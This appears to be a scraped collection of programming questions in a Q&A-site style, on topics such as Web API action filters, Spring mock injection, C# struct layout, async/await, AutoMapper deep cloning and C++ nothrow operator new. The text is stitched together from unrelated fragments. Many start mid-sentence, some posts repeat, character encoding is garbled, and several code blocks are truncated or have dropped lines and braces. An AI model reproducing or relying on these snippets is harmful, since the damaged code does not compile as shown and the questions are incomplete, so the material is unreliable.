 The problem is the content is always empty either in ActionExecuting or ActionExecuted. I think this is because FromBody runs before my Log attribute unlike their order in the code. And again I think its because of finding the best action/controller match for the request according to action parameters (Route Processing). After that my request body is cleared since request body is non-buffered in WebApi. I want to know if there is any way to change the run time order of FromBody attribute and my Log attribute? or something else that solves the problem! I should mention that I don't want to remove FromBody and using HttpRequestMessage instead of my Model or something like that.
@CODE:public class LogAttribute : ActionFilterAttribute
{
    // ..
    public override void OnActionExecuting(HttpActionContext actionContext)
    {
        // stuff goes here

@TITLE:How to inject a Mock in a Spring Context [duplicate]
@CONTENT:This question already has an answer here: Injecting Mockito mocks into a Spring bean 22 answers I have a test that is using some Spring contexts. In these contexts, a number of beans are declared. I want the test to use the actual implementation of the beans of the contexts, EXCEPT for one of them, for which I want to use a MOCK. I tried to make the Test a Configuration component (with @Configuration annotation), but the XML seems to take priority over the @Bean annotation, so it doesn't work, this way: @RunWith(SpringJUnit4ClassRunner.class) 
@ContextConfiguration(locations = {"context1.xml", "context2.xml", ...})

    private AnotherBean myMock = mock(AnotherBean.class);

    @Bean
    public AnotherBean myMock() { return myMock; }

    .....
 I know that i can define the Mocks in XML, but for that I would need an extra XML file for each test in which I wish to do this. I want to avoid this complexity. Is there a way to inject a bean (like a mock) in a context apart than through XML? Thank you!

 I expect this output BOTH on x86 and x64: 4 or 8 (depending on x86 or x64) 2 3 1 6 0 4 5 garbage What I get instead on x86: 4 6 0 2 3 1 4 5 garbage What I get instead on x64: 8 6 0 2 3 1 0 4 5 More: - The problem goes away when I remove the LayoutKind.Explicit and FieldOffset attributes. - The problem goes away when I remove the Bool field. - The problem goes away when I remove the Long field. - Note that on x64 it seems that the Pack=4 attribute parameter is ignored too? This applies in .Net3.5 and also .Net4.0 My question: what am I missing? Or is this a bug? I found a similar question: Why does LayoutKind.Sequential work differently if a struct contains a DateTime field? But in my case the layout changes even when the attribute of the substruct changes, without any changes to data types. So it does not look like an optimization. Besides that, I would like to point out that the other question is still unanswered. In that other question they mention that the layout is respected when using Marshalling. I havent tested that myself but I wonder why is the layout not respected for unsafe code, since all the relevant attributes seem to be in place? Does the documentation mention somewhere that these attributes are ignored unless Marshalling is done? Why? Considering this, can I even expect LayoutKind.Explicit to work reliably for unsafe code? Moreover, the documentation mentions the motive of keeping structs with expected layout: To reduce layout-related problems associated with the Auto value, C#, Visual Basic, and C++ compilers specify Sequential layout for value types. But this motive apparently does not apply to unsafe code?

@TITLE:OnLoadFinished() called twice
@CONTENT:I'm trying to figure out if I'm doing something wrong with respect to Loaders. I'm using the support library, and I have a Fragment which in onCreate() calls initLoader() setting itself as the LoaderCallbacks, however on a rotation it is receiving the result twice in onLoadFinished(), once as a result of calling init (and it already having the data), and once as a result of FragmentActivity looping through all Loaders in onStart() and delivering the result since it already has the data. If I only call init once (on first launch of the Fragment), it doesn't set itself as the callback for the Loader so it doesn't receive a call to onLoadFinished at all. It seems as though onLoadFinished should only be called once since some expensive things may be done in onLoadFinished() (such as clearing list adapters, etc.), so I'm just trying to figure out if this is a bug or if I am just calling init at the wrong time or something else. Anyone have any insight to this issue?

@TITLE:Swing and AWT Mixing is bad, but still done, why?
@CONTENT:I have noticed that people recommend not intermixing Swing and AWT Components, however we see this alot: import javax.swing.AbstractButton;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JFrame;
import javax.swing.ImageIcon;
 //AWT imports though only for listeners
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
 So why do many including Java (because I got that off their tutorial here) still use AWT imports, though I see its mainly for Listeners. How do you add native Swing Listeners/Libraries for stuff like Key, Button, JComboBox presses/slections etc? Or would I use firePropertyChangeListeners()? (though that relates to Java Beans) It has been confusing me now for some time, most of my app have Swing and AWT which is said to be bad?

@LINK:/questions/12016322/async-all-the-way-down
@TITLE:Async all the way down?
@CONTENT:Trying to understand the new async/await pattern, I have one question which I can't find an answer to, namely if I should decorate my methods with async, if I intend to call those methods from other async functions, or just return Tasks where appropriate? In other words, which of these classes A, B or C is best, and why? class A<T>
{
      public async Task<T> foo1() //Should be consumed
      {
          return await foo2();
      }

      public async Task<T> foo2() //Could be consumed
      {
          return await foo3();
      }

      private async Task<T> foo3() //Private
      {
          return await Task.Run(...);
      }
}

class B<T>
{
      public async Task<T> foo1() //Should be consumed
      {
          return await foo2();
      }

      public async Task<T> foo2() //Could be consumed
      {
          return await foo3();
      }

      private Task<T> foo3() //Private
      {
          return Task.Run(...);
      }
}

class C<T>
{
      public async Task<T> foo1() //Should be consumed
      {
          return await foo2();
      }

      public Task<T> foo2() //Could be consumed
      {
          return foo3();
      }

      private Task<T> foo3() //Private
      {
          return Task.Run(...);
      }
}
 It seems redundant to overdecorate methods so I naturally lean toward C, but at the same time it feels somewhat awkward to work with Task<T> unless you use the await keyword.
@CODE:Task class A<T>
{
      public async Task<T> foo1() //Should be consumed

          return await foo2();
      }

 myList is initialized with an initial capacity of 7, then the next line attempts to add the String "Hello" at position 5. This throws an IndexOutOfBoundsException: Exception in thread "main" java.lang.IndexOutOfBoundsException: Index: 5, Size: 0 I looked over this question about what "initial capacity" means in terms of an ArrayList. I understand that this particular constructor is allocating room for 7 String elements, and if we try to add 8 elements to the list it'll have to allocate more room. What I don't understand is why it doesn't create an "empty" list of size 7, with null values at each index, similar to what would happen if we declared String[] myArray = new String[7]. I recall learning that ArrayList is Java's implementation of a dynamic array, so I'd expect a similar sort of behavior. If I don't actually have space for 7 Strings allocated when I declare new ArrayList<String>(7), what is actually happening?
@CODE:List<String> myList = new ArrayList<String>(7);

Because the project launches right away I cannot access any of Xcode's features. I can't even figure out how to stop the project from launching on start up.

Reinstalled Xcode. - Still launches the projects and freezes Moved my projects from original folder - Still launches the projects and freezes Created a new iOS user2 and launched Xcode - does NOT launch projects OR freeze yay!

@LINK:/questions/10292868/how-do-i-pretty-print-a-table-in-haskell
@TITLE:How do I pretty-print a table in Haskell?
@CONTENT:I would like to prettyprint a table-like data structure in Haskell (a list of columns). For example... Table [
    StrCol "strings" ["a", "bc", "c"],
    IntCol "ints" [1, 30, -2],
    DblCol "doubles" [2.0, 4.5, -3.2]]
 Should render something like... strings ints doubles
    "a"    1     2.0
   "bc"   30     4.5
    "c"   -2    -3.2
 Currently I have implemented this functionality in Text.PrettyPrint that comes with the most recent version of the Haskell Platform. Unfortunately the <+> operator orients multi-line documents "diagonally" from each other. eg (text "a" $+$ text "b") <+> (text "c" $+$ text "d")
 renders as a
b c
  d
 rather than a c
b d
 As a result, I transpose the cells and merge them horizontally first, then vertically, but this results in the columns not being aligned. In an older table pretty-printing question, augustss refers to adding some more code to have the columns automatically adapt to the widest entry. I'm guessing that "sizedText" with the maximum length of each column would do this, except that this function doesn't appear to be part of the Haskell Platform Text.PrettyPrint module (I think it's in the closely related Text.Pretty package). What's the simplest non-hacky way of implementing this pretty-print functionality? This is a small part of my project so I'd like to avoid writing my own pretty-printing, and I'd prefer to avoid module dependencies if I can.
@CODE:Table [
    StrCol "strings" ["a", "bc", "c"],

@TITLE:Better alternative to Apache Tiles
@CONTENT:I'm looking for a framework that is better and easier to use than Apache Tiles (which so far, I have used a couple of times). With Tiles, it seems that when I have 100 actions I need to creates 100 jsp files and create 100 definitions in tiles.xml. Is there a better framework to manage my templates? I want to create, for example, 2 templates: a) menu and column for content b) menu, column for content, right column with banner In both templates the menu is constant. In template b, the right column is constant, so only the content column is different. For this simple example I don't want to define each JSP file that extends the template a (just to provide a body). Thats lame imo. Or maybe I`m lame and I can define a DEFAULT template in Apache Tiles and I'm just not using it right. In anycase, all help appreciated.

@TITLE:MFMessageComposeViewController on Simulator - canSendText?
@CONTENT:following situation: I want to send in app SMS. This is my code creating the MFMessageComposeViewController: -(void) showMessageComposerWithText:(NSString*)messageText telNumber:(NSString*)telNumber composeDelegate:(id)delegate
{
    MFMessageComposeViewController *controller = [[MFMessageComposeViewController alloc] init];
    if([MFMessageComposeViewController canSendText])
    {   
        controller.body = messageText;
        controller.recipients = [NSArray arrayWithObject:telNumber];
        controller.messageComposeDelegate = delegate;

        [delegate presentModalViewController:controller animated:YES];
    }
}
 So I think this is straight forward. When testing in Simulator I get following exception: Application tried to push a nil view controller on target <MFMessageComposeViewController: 0x8a4e090>. I'm also wondering myself why [MFMessageComposeViewController canSendText] returns YES when running the app in the simulator. When running on the device, everything is working correctly. I couldn't find anything in the docs/web concerning this strange behavior. I'm running Xcode 4.3 on OS 10.7.3, Deployment Target is iOS 5.0. Thanks in advance, tubtub

@TITLE:Is there an issue with CGColorGetComponents?
@CONTENT:When I call CGColorGetComponents with the CGColor returned from a UIColor, it seems to work properly except with white and black. Here's the code... CGColorRef myColorRef = [[UIColor whiteColor] CGColor];

const CGFloat * colorComponents = CGColorGetComponents(myColorRef);

NSLog(@"r=%f, g=%f, b=%f, a=%f",
    colorComponents[0],
    colorComponents[1],

    colorComponents[3]);
 This logs r=1.000000, g=1.000000, b=0.000000, a=0.000000
 Note both B and A are zero, not one. If you substitute other colors like redColor, blueColor, etc., it works... the RGB and A values are set as one would expect. But again, black and white produce odd results. Is there some issue with this function or is there some workaround/task I should be doing?

@TITLE:REST vs SOAP evolvability
@CONTENT:I get the benefits of changing link uris, but that's really not what this question is about. What I mean by evolvability is adding new features to a service or modifying (when possible) existing ones and that's actually it. SOAP isn't that bad as REST community tends to talk about it when it comes to evolvability. For example: In REST we can add new rel - in SOAP we can add new method. Both types of old clients will continue working with new services. In REST we can add new form field and set its default value - in SOAP we could have service arguments as some ServiceArgs class and add a new field to ServiceArgs. That's ugly, but it works. What are the evolvability examples when SOAP clients break and you can do nothing about it, while REST clients are handling the situation gracefully? Thanks!

I think solution is to periodically check if FB and twttr are defined, and then proceed with executing my script. But I have no idea how to do this.

@CONTENT:I have a jQuery UI draggable, and I've tried to create a custom helper which would contain some but not all information of the original element. Here's my draggable elements; <ul>
  <li><div>Name</div> <span>12-12-2011</span></li>

 And jQuery; $("ul li").draggable(function(){

 The idea would be that while dragging, the user would have a helper that contains only the name, but not the time element. My actual code is slightly more complex than this even, so what I'm really looking for is any selector that would allow me to select the original element, or a copy of it, and then do all kinds of jQuery magic on it (filtering elements, adding new elements, classes, etc.) However, for my life I can't find this, the documentation of draggable sucks and nobody at #jquery would help me. Any ideas? Thanks in advance!

@LINK:/questions/8414447/when-to-use-volatile-to-counteract-compiler-optimizations-in-c-sharp
@TITLE:When to use volatile to counteract compiler optimizations in C#
@CONTENT:I have spent an extensive number of weeks doing multithreaded coding in C# 4.0. However, there is one question that remains unanswered for me. I understand that the volatile keyword prevents the compiler from storing variables in registers, thus avoiding inadvertently reading stale values. Writes are always volatile in .Net, so any documentation stating that it also avoids stales writes is redundant. I also know that the compiler optimization is somewhat "unpredictable". The following code will illustrate a stall due to a compiler optimization (when running the release compile outside of VS): class Test
{
    public struct Data
    {
        public int _loop;
    }

    public static Data data;

    public static void Main()
    {
        data._loop = 1;
        Test test1 = new Test();

        new Thread(() =>
        {
            data._loop = 0;
        }
        ).Start();

        do
        {
            if (data._loop != 1)
            {
                break;
            }

            //Thread.Yield();
        } while (true);

        // will never terminate
    }
}
 The code behaves as expected. However, if I uncomment out the //Thread.Yield(); line, then the loop will exit. Further, if I put a Sleep statement before the do loop, it will exit. I don't get it. Naturally, decorating _loop with volatile will also cause the loop to exit (in its shown pattern). My question is: What are the rules the complier follows in order to determine when to implicity perform a volatile read? And why can I still get the loop to exit with what I consider to be odd measures?

Now every time I reload the designer I get an exception: Unable to determine application identity of the caller. at System.IO.IsolatedStorage.IsolatedStorage.InitStore(IsolatedStorageScope scope, Type appEvidenceType) at System.IO.IsolatedStorage.IsolatedStorageFile.GetStore(IsolatedStorageScope scope, Type applicationEvidenceType) at System.IO.IsolatedStorage.IsolatedStorageSettings.get_ApplicationSettings() at SettingsSample.AppSettings..ctor() in C:..\Settings.cs:line 34 Is this a bug in Visual Studio/Windows Phone SDK? This is the code in the constructor at line 34: public AppSettings()
    {
        // Get the settings for this application.
        try
        {
            settings = IsolatedStorageSettings.ApplicationSettings;
        }
        catch (System.Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }
 I added the try-catch to see what was going on. I suspect that Visual Studio(the caller) is attempting to run the code but there is no application(application identity) associated, so it fails. Maybe? Any thoughts?
@CODE:public AppSettings()
    {
        // Get the settings for this application.
        try
        {
            settings = IsolatedStorageSettings.ApplicationSettings;

@TITLE:Plot weighted frequency matrix
@CONTENT:This question is related to two different questions I have asked previously: 1) Reproduce frequency matrix plot 2) Add 95% confidence limits to cumulative plot I wish to reproduce this plot in R: I have got this far, using the code beneath the graphic: #Set the number of bets and number of trials and % lines
numbet <- 36 
numtri <- 1000 
#Fill a matrix where the rows are the cumulative bets and the columns are the trials
xcum <- matrix(NA, nrow=numbet, ncol=numtri)

x <- sample(c(0,1), numbet, prob=c(5/6,1/6), replace = TRUE)
xcum[,i] <- cumsum(x)/(1:numbet)

#Plot the trials as transparent lines so you can see the build up
matplot(xcum, type="l", xlab="Number of Trials", ylab="Relative Frequency", main="", col=rgb(0.01, 0.01, 0.01, 0.02), las=1)

@TITLE:What does the 'new' keyword actually do in Java, and should I avoid creating new objects?
@CONTENT:I signed up a few moments ago, though I've been making great use of this site since I took up computer programming, which I've been teaching myself and consider a little hobby of mine. I did look up for similar questions, but in fact I couldn't find the answer I was seeking for. Now, being aware that, in Java (that's the language I was suggested to start off with), it is considered good programming practise to declare and instantiate variables as you need them, please consider the following lines: class MyClass {
    void myMethod() {
        AnotherClass myObject = new AnotherClass();
        myObject.doStuff();
    }
}
 Now, suppose I invoke myMethod(), say, 10 times while running my program, how does that work? Is a new object create every time? Is the myObject variable reallocated every time? Does the complier skip that like of code as it sees that the object has already been created and the variable myObject already been assigned to such object? In a nutshell: should I write code like that only if I plan to invoke that method only once? I know... shame on me for asking such a stupid question, but please give me a chance! Thanks in advance! --------------------------- edited ----------------------------- So now am I supposed to edit this post after I get new answers? btw... gosh that was quick, thanks a lot! And wow that confused me, a lot, I guess that's due to the fact that I've been teaching myself so... Anyways, isn't it useless to create a new AnotherClass Object for the myObject variable every time? I mean, if i want to use the myObject variable throughout my program, shouldn't I declare it Once And For All? maybe in another method, that I'm going to invoke only once? Because as far as I understand, every time i invoke myMethod() a new object is creating, thus overriding myObject's own properties aka variables or am I just talking nonsense? --------------------------- edited ----------------------------- My doubts came after reading this code from some website I can't remember right now:     public class DataBase {

    private static String buf, retString = "\n";
    private static File file = new File("test.txt");

    public static void readText(JTextArea area) {   
        try {
            FileReader fr = new FileReader (file);
            BufferedReader br = new BufferedReader(fr);
            while ((buf = br.readLine()) != null) {
                area.append(buf); 
                area.append(retString);
            }
            br.close(); 
            fr.close();
        }
        catch (IOException e) {
            System.out.println("Exception: " + e);
        }
    }

    public static void writeText(JTextArea area) {
        try {
            FileWriter fw = new FileWriter (file);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(area.getText());
            bw.close(); 
            fw.close();
        }
        catch (IOException e) {
            System.out.println("Exception: " + e);
        }
    }
}
 I mean, why not declare FileWriter, FileReader, BufferedReader and BufferedWriter at the top of the class as they did for the other variables? and why not initialise them as well maybe in the constructor? Why doing it every time the method is called rather than using maybe the same instance variable?
@CODE:class MyClass {
    void myMethod() {
        AnotherClass myObject = new AnotherClass();
        myObject.doStuff();
    }
} new AnotherClass myObject myMethod() public class DataBase {

    private static String buf, retString = "\n";
    private static File file = new File("test.txt");

    public static void readText(JTextArea area) {   
        try {
            FileReader fr = new FileReader (file);
            BufferedReader br = new BufferedReader(fr);
            while ((buf = br.readLine()) != null) {
                area.append(buf); 
                area.append(retString);
            }
            br.close(); 
            fr.close();
        }
        catch (IOException e) {
            System.out.println("Exception: " + e);
        }
    }

    public static void writeText(JTextArea area) {
        try {
            FileWriter fw = new FileWriter (file);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(area.getText());
            bw.close();

@TITLE:Measure bounding box of text node in Javascript
@CONTENT:I'm having trouble getting the size, in pixels, of a text node using Javascript. Example: 
<p>
  first text block
  <b>second text block</b>
</p>
 I need to get the bounding box of the two text blocks independently. I could get the size of the second block just by measuring the <b> element, but the first one eludes me. It doesn't appear that textnodes in Javascript have a height or width, so far as I can tell. Wrapping the first text block in a <span> and measuring that is not an option, because I've discovered that a span does not necessarily inherit all of the styles above it, and when I wrap the text it suddenly changes size. It's like the Heisenberg Uncertainty Principle of Javascript; my attempt to measure something changes it. I'm building an app that breaks HTML into pages (EPUB HTML, actually), and I need to know the position, height, and width of each block of text on the page so I can know whether to put it on this page or the next page. Any suggestions?

@TITLE:Android library project uses declare-styleable ¡X how to compile?
@CONTENT:I have a custom preferences control that I have defined a few attributes for in values/attrs.xml. Just to focus the conversation, here is an example of attributes that could be found in values/attrs.xml: <?xml version="1.0" encoding="utf-8"?>

    <declare-styleable name="MyCustomView">

        <attr name="extraInformation" format="string" />

</resources>
 To use the attributes, you use an xmlns tag where you want to use it, and it looks something like this: xmlns:custom="http://schemas.android.com/apk/res/com.conundrum.app.lib"
 Herein lies the problem: the xmlns definition refers to the LIBRARY's package name, and this resource compiles fine in the LIBRARY project. However, the Android project that includes the Library project has a different package name and Android tries to merge all the resources. When it gets to this xmlns definition, it balks because the package name is different in the including Android project. Anybody got any ideas for using xmlns references in Library projects that are still valid in including Android projects? Were declare-styleables just an oversight by the Android team when they considered libraries?

Both of them seem to return the same results and cURL seems to be more complicated to use, but what is the difference among them. why do most people recommend using cURL over file_get_contents? Before i run the api which might take a whole day to process, i will like to have feedback.

@TITLE:¡§Ignoring InnerClasses attribute¡¨ warning is killing Eclipse
@CONTENT:I have a couple of imported jars that have this error in Eclipse when the project builds: [2011-04-08 16:31:48 - MokbeeAndroid] Dx warning: Ignoring InnerClasses attribute for an anonymous inner class
(net.sf.antcontrib.logic.ForEach$1) that doesn't come with an
associated EnclosingMethod attribute. This class was probably produced by a
compiler that did not target the modern .class file format. The recommended
solution is to recompile the class from source, using an up-to-date compiler
and without specifying any "-target" type options. The consequence of ignoring
this warning is that reflective operations on this class will incorrectly
indicate that it is *not* an inner class.
 Now, I didn't really care at first, because there were no errors. But I've now added Apache Sanselan, which has the same problem. Other Apache jars also do this, and not just once per jar, but once per class-that-has-an-inner-class, which makes every build pump out a monstrous console log. Worse, each warning seems to slow the Eclipse build process, and eventually Eclipse just crashes due to a memory overflow error. It's at the point where I can't build anything, even straight after my computer starts up. The solution would seem to be to recompile the source (open-source and all), but none of it can be recompiled in anything but Maven, which, after doing so to no avail, I suspect is causing the problem in the first place. I don't care about the results of the warning, just that Eclipse doesn't spend all it's memory on telling me about it. So, is there a way I can either remove the problem, or make Eclipse stop slowing down on it (skipping that check, maybe)?

    GroupList<Person> list = item as GroupList<Person>;
    if (list != null && !list.IsLeaf)
        return GroupTemplate;
    return ItemTemplate;
}
}
 The GroupTemplate data template references the ListTemplateSelector inside itself, so this is why I have set up like I have it set up. It's the only recursive hack I could put together. But that's not the problem I'm having. My problem is, I want to change from ItemTemplate to GroupTemplate when the IsLeaf property changes. This works beautifully the very first time since it reads the property the first time. But once this property changes, the template selector doesn't get reapplied. Now, I could use triggers to bind to the value and set the item template appropriately, but I need to be able to set a different template for each item, as they could be in a different state. For instance, say I have a list of groups like this: Group 1: IsLeaf = false, so template = GroupTemplate Group 2: IsLeaf = true, so template = ItemTemplate Group 3: IsLeaf = false, so template = GroupTemplate And once group 1's IsLeaf property changes to true, the template needs to automatically change to ItemTemplate.

@TITLE:How to deep clone objects containing an IList property using AutoMapper
@CONTENT:I am trying to deep clone the following class using AutoMapper: public class MainData
{
    public MainData()
    {
        Details = new List<Detail>();
    }

    public int Id { get; private set; }
    public DateTime LastUpdate { get; private set; }
    public IList<Detail> Details { get; private set; }
    public int Prop1 { get; set; }
    public int Prop2 { get; set; }

    public void AddDetail(Detail detail)
    {
        Details.Add(detail);
    }

    public void RemoveDetail(Detail detail)
    {
        Details.Remove(detail);
    }

    public MainData Clone()
    {
        Mapper.Reset();
        Mapper.CreateMap<MainData, MainData>().ForMember(d => d.Id, o => o.Ignore());
        // Mapper.CreateMap<Detail, Detail>().ForMember(d => d.Id, o => o.Ignore()); // REMOVED
        var newMainData = new MainData();
        Mapper.Map(this, newMainData);
        newMainData.Details = this.Details.Select(item => item.Clone()).ToList(); // ADDED
        return newMainData;
    }
}

public class Detail
{
    public int Id { get; private set; }
    public string Name { get; set; }
    public double Area { get; set; }
    public double Height { get; set; }

    public Detail Clone() // ADDED
    {
        Mapper.CreateMap<Detail, Detail>().ForMember(d => d.Id, o => o.Ignore());
        var newDetail = new Detail();
        Mapper.Map(this, newDetail);
        return newDetail;
    }
}
 The Clone method works fine for the MainData properties but seems to only do a shallow copy of the Details list. I have tried adding .ForMember(d => d.Details, o => o.UseDestinationValue()) but this does not copy the Details list at all. How can I get the Details list deep cloned as well ie, so I end up with two totally independent objects including all the list items? UPDATE: I need to exclude the Id property as I am using these objects with NHibernate so not sure if the Serializable solution will do this. UPDATE2: Modified the above code to clone the IList too. This seems to work fine as I can exclude properties that make NHibernate think it has already been saved.
@CODE:public class MainData
{
    public MainData()
    {
        Details = new List<Detail>();
    }

    public int Id { get; private set; }
    public DateTime LastUpdate { get; private set; }
    public IList<Detail> Details { get; private set; }
    public int Prop1 { get; set; }
    public int Prop2 { get; set; }

    public void AddDetail(Detail detail)

        Details.Add(detail);
    }

    public void RemoveDetail(Detail detail)

 The Clone method works fine for the MainData properties but seems to only do a shallow copy of the Details list. I have tried adding .ForMember(d => d.Details, o => o.UseDestinationValue()) but this does not copy the Details list at all. How can I get the Details list deep cloned as well ie, so I end up with two totally independent objects including all the list items? UPDATE: I need to exclude the Id property as I am using these objects with NHibernate so not sure if the Serializable solution will do this. UPDATE2: Modified the above code to clone the IList too. This seems to work fine as I can exclude properties that make NHibernate think it has already been saved.
@CODE:public class MainData
{
    public MainData()
    {
        Details = new List<Detail>();
    }

    public int Id { get; private set; }
    public DateTime LastUpdate { get; private set; }
    public IList<Detail> Details { get; private set; }
    public int Prop1 { get; set; }
    public int Prop2 { get; set; }

    public void AddDetail(Detail detail)
    {
        Details.Add(detail);
    }

    public void RemoveDetail(Detail detail)
    {
        Details.Remove(detail);
    }

    public MainData Clone()
    {
        Mapper.Reset();
        Mapper.CreateMap<MainData, MainData>().ForMember(d => d.Id, o => o.Ignore());
        // Mapper.CreateMap<Detail, Detail>().ForMember(d => d.Id, o => o.Ignore()); // REMOVED
        var newMainData = new MainData();
        Mapper.Map(this, newMainData);
        newMainData.Details = this.Details.Select(item => item.Clone()).ToList(); // ADDED
        return newMainData;
    }
}

public class Detail
{
    public int Id { get; private set; }
    public string Name { get; set; }
    public double Area { get; set; }
    public double Height { get; set; }

    public Detail Clone() // ADDED
    {
        Mapper.CreateMap<Detail, Detail>().ForMember(d => d.Id, o => o.Ignore());
        var newDetail = new Detail();
        Mapper.Map(this, newDetail);
        return newDetail;
    }
} Clone .ForMember(d => d.Details, o => o.UseDestinationValue())

    { "label": "United States", "value": "United States", "id": "2" },

 I've used the answer here to get the mustMatch working, but unfortunately if I "tab" away from the input box or if I type the word completely rather than actually selecting the suggested text, I get the "Nothing selected" response instead of an Value and ID. Does anyone know how to extract the id out of the autocomplete when you don't actually select the field?

The question is in regards to the C++ standard when talking about the nothrow version of operator new. 18.4.1.1/7 reads (my emphasis): This nothrow version of operator new returns a pointer obtained as if acquired from the ordinary version. My understanding is that "as if" does not require a specific implementation as long as the behavior is appropriate. So if operator new was implemented like this (I know this is not a compliant implementation as there is no loop or use of the new_handler; but I'm shortening that to focus on my issue): // NOTE - not fully compliant - for illustration purposes only.
void *operator new(std::size_t s)
{
    void *p = malloc(s);
    if (p == 0)
        throw std::bad_alloc();
    return p;
}
 Then it would be legal to write the nothrow version like this: // NOTE - not fully compliant - for illustration purposes only.
void *operator new(std::size_t s, const std::nothrow_t &nt)
{
    return malloc(s);
}
 But let's say a program replaces operator new to use some other allocator. Does "as if" mean the compiler has to automatically change the behavior of the nothrow version to use this other allocator? Is the developer required to replace both the plain and nothrow versions?
@CODE:operator new operator new // NOTE - not fully compliant - for illustration purposes only.
void *operator new(std::size_t s)
{
    void *p = malloc(s);
    if (p == 0)
        throw std::bad_alloc();
    return p;
} // NOTE - not fully compliant - for illustration purposes only.
void *operator new(std::size_t s, const std::nothrow_t &nt)
{
    return malloc(s);
} operator new

@TITLE:Are Python 2.5 .pyc files compatible with Python 2.6 .pyc files?
@CONTENT:A while ago I had to upgrade some servers from Python 2.4 to Python 2.5. I found that .pyc files created under Python 2.4 would crash when Python 2.5 tried to run them. Will this happen again when I upgrade from 2.5 to 2.6? EDIT: Here is a bit more detail I have a fileserver that contains the python code. This is accessed by both Ubuntu and Windows servers to run the python code. When they run the code they produce .pyc files on the fileserver. I found that when I upgraded one of the server machines from Python 2.4 to 2.5 I had problems with .pyc files. I'm now not sure whether it was a machine running 2.5 that tried to run 2.4 bytecode or whether it was a 2.4 machine trying to run 2.5 bytecode, but if I deleted the bytecode all went well until the next bytecode clash. I upgraded all of the machines to 2.5 and the problem went away.

@TITLE:How can I fool a site that looks at the JavaScript object 'navigator' to see that I'm not on Windows?
@CONTENT:I am trying to browse a website, however, it only works under Windows and Mac because they use the navigator.platform from JavaScript to find out the architecture I am running on. Of course, they also use the browser's user agent, but that was easy to spoof. Here is the .js in question: http://pastebin.com/f56fd608d. The code responsible for browser detection is at the top. Is there any way of changing the .js file before the site runs, or something similar, so I can eliminate the check? Using the JavaScript console yields: >navigator.platform Linux i686 Evidently I changed the browser's user agent, but navigator.platform does not seem to take it's value from the user agent. Maybe someone knows how to change the value returned by navigator.platform, because I hate running Windows under VirtualBox to use this site.

@TITLE:OnCheckedChanged event handler of asp:checkbox does not fire when checkbox is unchecked
@CONTENT:I have a repeater, in each ItemTemplate of the repeater is an asp:checkbox with an OnCheckedChanged event handler set. The checkboxes have the AutoPostBack property set to true. When any of the checkboxes is checked, the event handler fires. When any is unchecked, the event handler does not fire. Any idea why the event does not fire, and how I mgiht make it fire? Thanks. Simplified repeater code: <asp:Repeater ID="rptLinkedItems" runat="server">            
    <ItemTemplate>      
    <asp:CheckBox ID="chkLinked" runat="server" 
     Checked="false" OnCheckedChanged="chkLinked_CheckedChanged" />
    </ItemTemplate>    
</asp:Repeater>
 The collection is bound to the repeater as follows: protected override void OnPreRenderComplete(EventArgs e)
        {
            if (!Page.IsPostBack)
            {
                m_linkedItems = GetLinkedItems();
                rptLinkedItems.DataSource = GetLinkableItems();
                rptLinkedItems.ItemDataBound += new RepeaterItemEventHandler
                       (rptLinkedItems_ItemDataBound);
                rptLinkedItems.DataBind();
            }

            base.OnPreRenderComplete(e);
        }
 The OnItemDataBound event handler is as follows: private void rptLinkedItems_ItemDataBound(Object sender, RepeaterItemEventArgs args)
        {
            if (args.Item.ItemType == ListItemType.Item || args.Item.ItemType == ListItemType.AlternatingItem)
            {
                CategoryItem item = args.Item.DataItem as CategoryItem;

                Literal litItemName = args.Item.FindControl("litItemName") as Literal;
                CheckBox chkLinked = args.Item.FindControl("chkLinked") as CheckBox;

                litItemName.Text = item.Text;

                chkLinked.Checked = IsItemLinked(item);
                chkLinked.AutoPostBack = true;
                chkLinked.InputAttributes.Add("Value", item.Id.ToString());
            }
        }
 The OnCheckedChanged event handler is as follows: protected void chkLinked_CheckedChanged(Object sender, EventArgs args)
{
            CheckBox linkedItem = sender as CheckBox;
            Boolean itemState = linkedItem.Checked;
            Int32 itemId = Int32.Parse(linkedItem.InputAttributes["Value"].ToString());
            DataAccessLayer.UpdateLinkedItem(m_linkingItem, Utilities.GetCategoryItemFromId(itemId), itemState);
}

@CONTENT:When debugging an application in Visual Studio, there are 2 options for breaking on exceptions. Break as soon as an exception is thrown, and breaking only when an exception isn't caught. This works fine when developing desktop applications. However, when developing ASP.NET applications, all exceptions are eventually caught by the code in IIS. Is it possible to disable this behavior, so that the debugger breaks when my ASP.Net application code fails to catch an exception? Edit: Just to be clear, I don't want to break whenever an exception is thrown, as many times they are handled just fine by my code, and I don't want to stop on every exception. I only want to stop on the exceptions that aren't handled by my code. Edit: This seems to not be an issue in Visual Studio 2008. In Visual Studio 2003, all exceptions were treated as user handled, because the ASP.NET runtime caught all the exceptions so as not to bring down the web server process. It seems that in Visual Studio 2008, this type of exception catching is not counted when checking for user-unhandled exceptions.

{
    KeyValuePair<??> pair = (KeyValuePair<??>)listBox.SelectedItem;
    object value = pair.Value;
}
 Is there a way to do this dynamically at runtime using reflection? I know it's possible to use reflection with generic types and determine the key/value parameters, but I'm not sure if there's a way to do the rest after those values are retrieved.
@CODE:if (listBox.ItemsSource is Dictionary<??>)
{
    KeyValuePair<??> pair = (KeyValuePair<??>)listBox.SelectedItem;
    object value = pair.Value;

@TITLE:Does full trust mean the same as Run As Administrator
@CONTENT:Does full trust mean the same as Run As Administrator? I have read things stating that "for this to work, the application must be a full-trust application." Is that the same as you must have administrator privileges to run the application? If not, what's the difference? How can you tell if an app is "full-trust"? I am told that "Administrator or not, .Net apps won't do certain things if they aren't running from a 'trusted' location." What is a "trusted location"? If you run an app from a "trusted location", can you do things that "require full-trust" without being an administrator?

@TITLE:Conditional Visibility and Page Breaks with SQL Server 2005 Reporting Services
